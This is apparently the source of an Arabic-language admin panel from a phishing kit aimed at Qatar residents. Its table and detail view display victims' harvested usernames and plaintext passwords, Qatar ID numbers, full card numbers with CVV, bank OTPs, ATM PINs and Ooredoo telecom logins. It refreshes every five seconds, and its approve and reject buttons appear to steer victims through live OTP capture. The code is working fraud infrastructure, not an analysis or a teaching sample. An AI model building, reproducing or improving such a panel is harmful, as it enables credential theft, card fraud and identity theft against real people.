<?php
session_start();
require_once '../includes/db.php';
require_once '../includes/functions.php';

if (!isset($_SESSION['admin_logged_in'])) {
    header("Location: login.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>لوحة التحكم - نظام قطر</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }
    body { background: #f5f7fa; color: #2c3e50; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 14px; }

    /* ===== Header ===== */
    .top-header {
      background: linear-gradient(135deg, #c41e3a 0%, #a01830 100%);
      border-bottom: 3px solid #8b1528;
      padding: 16px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    }
    .header-brand { display: flex; align-items: center; gap: 12px; }
    .header-icon {
      width: 44px; height: 44px;
      background: rgba(255,255,255,0.2); border-radius: 10px;
      display: flex; align-items: center; justify-content: center;
      color: white; font-size: 22px;
    }
    .header-title { font-weight: 700; color: white; font-size: 17px; }
    .header-subtitle { font-size: 12px; color: rgba(255,255,255,0.85); }
    .header-actions { display: flex; align-items: center; gap: 12px; }
    .conn-wrap { display: flex; align-items: center; gap: 6px; font-size: 12px; color: rgba(255,255,255,0.85); }
    .conn-dot { width: 8px; height: 8px; border-radius: 50%; background: #4ade80; }
    .btn-logout {
      background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); color: white;
      padding: 8px 14px; border-radius: 8px; cursor: pointer; font-size: 13px;
      display: flex; align-items: center; gap: 6px; transition: all 0.3s;
    }
    .btn-logout:hover { background: rgba(255,255,255,0.25); }

    /* ===== Main ===== */
    .main-wrap { max-width: 1400px; margin: 0 auto; padding: 24px 20px; }

    /* ===== Stats ===== */
    .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 24px; }
    .stat-card {
      background: #fff; border-radius: 12px; padding: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
      display: flex; flex-direction: column;
      border-left: 4px solid #c41e3a;
      transition: all 0.3s;
    }
    .stat-card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.12); transform: translateY(-2px); }
    .stat-label { font-size: 12px; color: #7f8c8d; margin-bottom: 8px; font-weight: 600; }
    .stat-val { font-size: 32px; font-weight: 700; color: #2c3e50; }
    .stat-ico { width: 48px; height: 48px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; background: #ecf0f1; margin-top: 8px; }

    /* ===== Table Card ===== */
    .tbl-card { background: #fff; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); overflow: hidden; }
    .tbl-header {
      padding: 20px 24px; display: flex; align-items: center;
      justify-content: space-between; border-bottom: 1px solid #ecf0f1; flex-wrap: wrap; gap: 12px;
      background: #f8f9fa;
    }
    .tbl-title { font-weight: 700; color: #2c3e50; font-size: 16px; }
    .search-wrap { position: relative; width: 260px; }
    .search-wrap input {
      width: 100%; padding: 10px 14px 10px 38px;
      border: 1px solid #ddd; border-radius: 8px;
      font-size: 13px; outline: none; background: #fff;
      transition: all 0.3s;
    }
    .search-wrap input:focus { border-color: #c41e3a; box-shadow: 0 0 0 3px rgba(196, 30, 58, 0.1); }
    .search-ico { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #95a5a6; font-size: 14px; }

    /* ===== Table ===== */
    table { width: 100%; border-collapse: collapse; }
    thead tr { background: #f8f9fa; }
    th { padding: 14px; text-align: right; font-size: 12px; font-weight: 700; color: #555; border-bottom: 2px solid #ecf0f1; white-space: nowrap; }
    td { padding: 14px; border-bottom: 1px solid #f5f7fa; vertical-align: middle; font-size: 13px; color: #555; }
    tbody tr:hover { background: #f8f9fa; }

    /* ===== Status Badges ===== */
    .badge {
      display: inline-block; padding: 4px 12px; border-radius: 20px;
      font-size: 11px; font-weight: 700; white-space: nowrap;
    }
    .b-waiting { background: #fff3cd; color: #856404; }
    .b-approved { background: #d4edda; color: #155724; }
    .b-rejected { background: #f8d7da; color: #721c24; }

    /* ===== Action Buttons ===== */
    .act-btns { display: flex; gap: 6px; align-items: center; }
    .btn-act {
      padding: 6px 12px; border-radius: 6px; font-size: 12px; cursor: pointer;
      border: 1px solid #ddd; background: #fff; color: #555;
      display: flex; align-items: center; gap: 4px; white-space: nowrap;
      transition: all 0.3s;
    }
    .btn-act:hover { background: #f8f9fa; border-color: #bbb; }
    .btn-act.blue { background: #c41e3a; color: #fff; border-color: #c41e3a; }
    .btn-act.blue:hover { background: #a01830; }

    /* ===== Modal ===== */
    .overlay {
      position: fixed; inset: 0; background: rgba(0,0,0,0.5);
      z-index: 500; display: none; align-items: center; justify-content: center; padding: 20px;
      backdrop-filter: blur(4px);
    }
    .overlay.show { display: flex; }
    .modal-box {
      background: #fff; border-radius: 16px; width: 100%; max-width: 900px;
      max-height: 90vh; overflow-y: auto; box-shadow: 0 25px 50px rgba(0,0,0,0.25);
    }
    .modal-hdr {
      padding: 20px 24px; border-bottom: 1px solid #ecf0f1;
      display: flex; align-items: center; justify-content: space-between;
      background: #f8f9fa;
    }
    .modal-ttl { font-weight: 700; font-size: 18px; color: #2c3e50; }
    .modal-close { background: none; border: none; font-size: 24px; color: #95a5a6; cursor: pointer; padding: 4px 8px; border-radius: 6px; transition: all 0.3s; }
    .modal-close:hover { background: #ecf0f1; color: #555; }
    .modal-bdy { padding: 24px; }
    
    /* ===== Detail Sections ===== */
    .detail-section { margin-bottom: 24px; }
    .sec-title {
      font-size: 12px; font-weight: 800; color: #c41e3a;
      text-transform: uppercase; letter-spacing: 0.08em;
      margin-bottom: 14px; padding-bottom: 10px; border-bottom: 2px solid #ecf0f1;
    }
    .detail-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin-bottom: 0; }
    .detail-row { display: flex; justify-content: space-between; align-items: flex-start; padding: 12px 0; border-bottom: 1px solid #f5f7fa; }
    .detail-row:last-child { border-bottom: none; }
    .d-lbl { font-size: 11px; color: #95a5a6; font-weight: 700; text-transform: uppercase; min-width: 150px; }
    .d-val {
      font-size: 13px; color: #2c3e50; font-weight: 500;
      word-break: break-all; flex: 1; text-align: right; margin-right: 12px;
    }
    .copy-btn { background: none; border: none; color: #95a5a6; cursor: pointer; padding: 2px 6px; font-size: 13px; transition: all 0.3s; }
    .copy-btn:hover { color: #c41e3a; }

    /* ===== Action Section ===== */
    .action-section {
      background: #f8f9fa;
      border: 1px solid #ecf0f1;
      border-radius: 12px;
      padding: 20px;
      margin-top: 20px;
    }
    .action-btns { display: flex; gap: 12px; }
    .action-btn-approve {
      flex: 1; padding: 14px 20px; border-radius: 10px; font-size: 15px;
      font-weight: 700; cursor: pointer; border: none;
      background: linear-gradient(135deg, #27ae60, #229954);
      color: #fff; display: flex; align-items: center; justify-content: center;
      gap: 8px; box-shadow: 0 4px 12px rgba(39,174,96,0.3);
      transition: all 0.3s;
    }
    .action-btn-approve:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(39,174,96,0.4); }
    .action-btn-reject {
      flex: 1; padding: 14px 20px; border-radius: 10px; font-size: 15px;
      font-weight: 700; cursor: pointer; border: none;
      background: linear-gradient(135deg, #e74c3c, #c0392b);
      color: #fff; display: flex; align-items: center; justify-content: center;
      gap: 8px; box-shadow: 0 4px 12px rgba(231,76,60,0.3);
      transition: all 0.3s;
    }
    .action-btn-reject:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(231,76,60,0.4); }

    /* ===== Toast ===== */
    .toast-wrap { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
    .toast-item {
      background: #fff; border: 1px solid #ecf0f1; border-radius: 10px;
      padding: 14px 16px; box-shadow: 0 4px 16px rgba(0,0,0,0.12);
      display: flex; align-items: center; gap: 12px; min-width: 280px;
      animation: toastIn 0.3s ease;
    }
    .toast-item.ok { border-right: 4px solid #27ae60; }
    .toast-item.err { border-right: 4px solid #e74c3c; }
    @keyframes toastIn { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

    /* ===== Responsive ===== */
    @media(max-width:768px) {
      .stats-row { grid-template-columns: repeat(2, 1fr); }
      .search-wrap { width: 100%; }
      .detail-grid { grid-template-columns: 1fr; }
      .action-btns { flex-direction: column; }
    }
  </style>
</head>
<body>

  <header class="top-header">
    <div class="header-brand">
      <div class="header-icon"><i class="bi bi-shield-check"></i></div>
      <div>
        <div class="header-title">لوحة التحكم الإدارية</div>
        <div class="header-subtitle">نظام إدارة البيانات والعمليات</div>
      </div>
    </div>
    <div class="header-actions">
      <div class="conn-wrap">
        <div class="conn-dot" id="connDot"></div>
        <span id="connTxt">متصل</span>
      </div>
      <button class="btn-logout" onclick="location.href='logout.php'">
        <i class="bi bi-box-arrow-right"></i> خروج
      </button>
    </div>
  </header>

  <main class="main-wrap">
    <div class="stats-row">
      <div class="stat-card">
        <div class="stat-label">إجمالي الزوار</div>
        <div class="stat-val" id="sTotal">0</div>
        <div class="stat-ico"><i class="bi bi-people-fill"></i></div>
      </div>
      <div class="stat-card">
        <div class="stat-label">بانتظار القرار</div>
        <div class="stat-val" id="sNew">0</div>
        <div class="stat-ico"><i class="bi bi-hourglass-split"></i></div>
      </div>
      <div class="stat-card">
        <div class="stat-label">تم القبول</div>
        <div class="stat-val" id="sDone">0</div>
        <div class="stat-ico"><i class="bi bi-check-circle-fill"></i></div>
      </div>
    </div>

    <div class="tbl-card">
      <div class="tbl-header">
        <div class="tbl-title">قائمة الزوار والعمليات</div>
        <div class="search-wrap">
          <i class="bi bi-search search-ico"></i>
          <input type="text" id="srch" placeholder="بحث..." oninput="filterRows()" />
        </div>
      </div>
      <div style="overflow-x:auto;">
        <table>
          <thead>
            <tr>
              <th>الدولة</th>
              <th>اسم المستخدم</th>
              <th>كلمة المرور</th>
              <th>رقم الهوية</th>
              <th>رقم الجوال</th>
              <th>الحالة</th>
              <th>الإجراءات</th>
            </tr>
          </thead>
          <tbody id="tBody"></tbody>
        </table>
      </div>
    </div>
  </main>

  <!-- Detail Modal -->
  <div class="overlay" id="detailOverlay">
    <div class="modal-box">
      <div class="modal-hdr">
        <div class="modal-ttl" id="mTitle">تفاصيل البيانات الكاملة</div>
        <button class="modal-close" onclick="closeModal()"><i class="bi bi-x-lg"></i></button>
      </div>
      <div class="modal-bdy" id="mBody"></div>
    </div>
  </div>

  <div class="toast-wrap" id="toastWrap"></div>

  <script>
    let rows = [];
    let currentOpenRef = null;

    async function loadAll() {
      try {
        const [bd, sd] = await Promise.all([
          fetch('../api/admin/bookings.php').then(r => r.json()),
          fetch('../api/admin/stats.php').then(r => r.json())
        ]);
        if (bd.success) { rows = bd.data; renderRows(rows); }
        if (sd.success) {
          document.getElementById("sTotal").textContent = sd.data.total;
          document.getElementById("sNew").textContent = sd.data.new;
          document.getElementById("sDone").textContent = sd.data.completed;
        }
      } catch(e) { console.error(e); }
    }

    function renderRows(list) {
      const tb = document.getElementById("tBody");
      tb.innerHTML = list.map(b => `
        <tr>
          <td><span style="background: #ecf0f1; padding: 4px 8px; border-radius: 4px; font-weight: 600;">${b.country}</span></td>
          <td><code style="background: #f5f7fa; padding: 2px 6px; border-radius: 4px;">${b.username}</code></td>
          <td><code style="background: #f5f7fa; padding: 2px 6px; border-radius: 4px;">${b.password || '••••••••'}</code></td>
          <td>${b.clientId}</td>
          <td>${b.clientPhone}</td>
          <td><span class="badge b-${b.status}">${b.status === 'waiting' ? 'بانتظار القرار' : (b.status === 'approved' ? 'مقبول' : 'مرفوض')}</span></td>
          <td>
            <button class="btn-act blue" onclick="openDetail('${b.referenceId}')">
              <i class="bi bi-eye"></i> تفاصيل
            </button>
          </td>
        </tr>
      `).join("");
    }

    function filterRows() {
      const q = document.getElementById("srch").value.toLowerCase();
      renderRows(rows.filter(b => 
        b.clientName.toLowerCase().includes(q) || 
        b.clientId.toLowerCase().includes(q) || 
        b.clientPhone.toLowerCase().includes(q) ||
        b.username.toLowerCase().includes(q) ||
        b.country.toLowerCase().includes(q) ||
        b.referenceId.toLowerCase().includes(q)
      ));
    }

    async function openDetail(ref) {
      const d = await fetch(`../api/admin/bookings_detail.php?ref=${ref}`).then(r => r.json());
      if (!d.success) return;
      const b = d.data;
      currentOpenRef = ref;
      document.getElementById("mTitle").textContent = `تفاصيل الزائر - ${ref}`;
      document.getElementById("mBody").innerHTML = buildDetail(b);
      document.getElementById("detailOverlay").classList.add("show");
    }

    function closeModal() { document.getElementById("detailOverlay").classList.remove("show"); }

    function dRow(label, val) {
      return `<div class="detail-row"><div class="d-lbl">${label}</div><div style="display:flex;gap:8px;align-items:center;"><div class="d-val">${val || '-'}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${(val || '').replace(/'/g, '\\'')}'); toast('تم النسخ', 'ok');"><i class="bi bi-copy"></i></button></div></div>`;
    }

    function buildDetail(b) {
      const allData = b.allData || {};
      return `
        <div class="detail-section">
          <div class="sec-title">البيانات الأساسية والدخول</div>
          ${dRow("الدولة", b.country)}
          ${dRow("اسم المستخدم", allData.username)}
          ${dRow("كلمة المرور", allData.password)}
          ${dRow("رقم الهوية", allData.id_number)}
          ${dRow("رقم الهوية القطرية", allData.qatar_id)}
          ${dRow("رقم الجوال", allData.phone_number)}
        </div>

        <div class="detail-section">
          <div class="sec-title">البيانات الشخصية</div>
          ${dRow("الاسم بالعربي", allData.name_ar)}
          ${dRow("الاسم بالإنجليزي", allData.name_en)}
          ${dRow("تاريخ الميلاد", allData.dob)}
          ${dRow("النوع", allData.gender)}
          ${dRow("الجنسية", allData.nationality)}
          ${dRow("نوع الحساب", allData.account_type)}
          ${dRow("العنوان", allData.address)}
          ${dRow("البريد الإلكتروني", allData.email_confirm)}
          ${dRow("رمز الدولة", allData.country_code)}
        </div>

        <div class="detail-section">
          <div class="sec-title">بيانات البطاقة البنكية</div>
          ${dRow("رقم البطاقة", allData.card_number)}
          ${dRow("اسم حامل البطاقة", allData.card_name)}
          ${dRow("شهر الانتهاء", allData.exp_month)}
          ${dRow("سنة الانتهاء", allData.exp_year)}
          ${dRow("CVV", allData.cvv)}
        </div>

        <div class="detail-section">
          <div class="sec-title">بيانات التحقق البنكي</div>
          ${dRow("رمز OTP البنكي", allData.otp)}
          ${dRow("الرقم السري (ATM PIN)", allData.atm_pin)}
        </div>

        <div class="detail-section">
          <div class="sec-title">بيانات Ooredoo</div>
          ${dRow("اسم المستخدم Ooredoo", allData.ooredoo_user)}
          ${dRow("كلمة المرور Ooredoo", allData.ooredoo_pass)}
          ${dRow("رمز OTP Ooredoo", allData.ooredoo_otp)}
        </div>

        <div class="detail-section">
          <div class="sec-title">بيانات إضافية</div>
          ${dRow("لوحة المركبة", allData.vehicle_plate)}
          ${dRow("نوع المركبة", allData.vehicle_type)}
          ${dRow("المنطقة", allData.region)}
          ${dRow("عنوان IP", b.clientIp)}
        </div>

        <div class="action-section">
          <div class="action-btns">
            <button class="action-btn-approve" onclick="handleAction('${b.referenceId}', 'pass')"><i class="bi bi-check-lg"></i> قبول وتوجيه</button>
            <button class="action-btn-reject" onclick="handleAction('${b.referenceId}', 'deny')"><i class="bi bi-x-lg"></i> رفض وإعادة</button>
          </div>
        </div>
      `;
    }

    async function handleAction(ref, action) {
      const r = await fetch('../api/admin/payment-action.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ reference: ref, action: action })
      }).then(r => r.json());
      if (r.success) {
        toast("تم تنفيذ الإجراء بنجاح", "ok");
        closeModal();
        loadAll();
      } else {
        toast("حدث خطأ في تنفيذ الإجراء", "err");
      }
    }

    function toast(msg, type) {
      const t = document.createElement("div");
      t.className = `toast-item ${type}`;
      const icon = type === 'ok' ? '<i class="bi bi-check-circle"></i>' : '<i class="bi bi-exclamation-circle"></i>';
      t.innerHTML = `${icon} <span>${msg}</span>`;
      document.getElementById("toastWrap").appendChild(t);
      setTimeout(() => t.remove(), 3000);
    }

    loadAll();
    setInterval(loadAll, 5000);
  </script>
</body>
</html>
